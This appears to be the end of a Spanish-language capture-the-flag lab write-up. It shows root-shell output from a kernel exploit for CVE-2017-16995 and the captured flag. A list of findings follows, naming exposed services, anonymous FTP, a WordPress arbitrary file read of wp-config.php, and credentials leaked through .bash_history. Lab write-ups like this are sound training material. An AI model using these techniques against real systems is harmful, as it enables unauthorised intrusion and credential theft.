Se esperó por 60 segundos:
```python
suid file detected, launching rootshell...
we have root privs now...
root@red:~/39772/ebpf_mapfd_doubleput_exploit# cd ~
root@red:~# ls
39772  __MACOSX  doubleput.zip
root@red:~# cd /root
root@red:/root# ls
fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql
root@red:/root# cat flag.txt 
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)  
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b
```

### Hallazgos de postura de seguridad
**Reconocimiento:**
- 21: FTP accesible y corriendo vsftpd.
	- Permite acceso anónimo
	- Versión identificable 3.0.3
- 22: SSH con huellas RSA, ECDSA y ED25519 visibles.
- 53: `dnsmasq 2.75` revelado por `dns-nsid` (versión antigua).
- 80: PHP cli server (no seguro enentorno de producción).
- 139: Samba v4.3.9 WORKGROUP
- 666: posible archivo filtrado `message2.jpg`.
- 3306: `MySQL 5.7.12` con información sensible expuesta.
- 12380: Apache 2.4.18 (versión desactualizada)

**VulnGathering:**
- FTP con acceso anónimo

**Engaño:**
- SMB y SSH vulnerables a fuerza bruta.
- Usar un exploit que lee archivos en el servidor y muestra públicamente en `wp-config.php`usando una función mal implementada para:
	- Leer archivos arbitrarios sin autenticación: `wp-config.php`
	- Hacer que WordPress los guarde y los exponga como si fueran imágenes.
	- Obtener información sensible como credenciales de base de datos.
- SMB con acceso por `guest` posible enumeración de usuarios.
- Respaldo de información inseguro
- Comentarios con información de usuarios
- Filtración en texto plano de contraseña de root de MySQL.

**Explotación:**

**GanarControl:**
- Credenciales filtradas en `.bash_history` por uso inseguro de `sshpass`.
- Ejecución de CVE-2017-16995, por kernel vulnerable y manejo inseguro de soporte para BFP.
